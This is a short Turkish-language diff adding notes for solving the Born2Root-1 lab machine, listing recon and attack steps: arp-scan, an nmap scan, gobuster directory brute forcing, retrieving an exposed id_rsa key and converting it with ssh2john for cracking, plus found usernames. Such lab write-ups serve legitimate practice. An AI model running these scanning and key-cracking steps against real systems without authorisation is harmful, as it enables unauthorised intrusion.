@@ -1,0 +1,7 @@
+BORN2ROOT-1 MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.129 bulundu.
+2 - nmap -sT -A 192.168.2.129
+3 - gobuster dir -u http://192.168.2.129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://192.168.2.129/icons/ -> id_rsa
+5 - ssh2john id_rsa > hash
+6 - Users: martin, hadi, jimmy
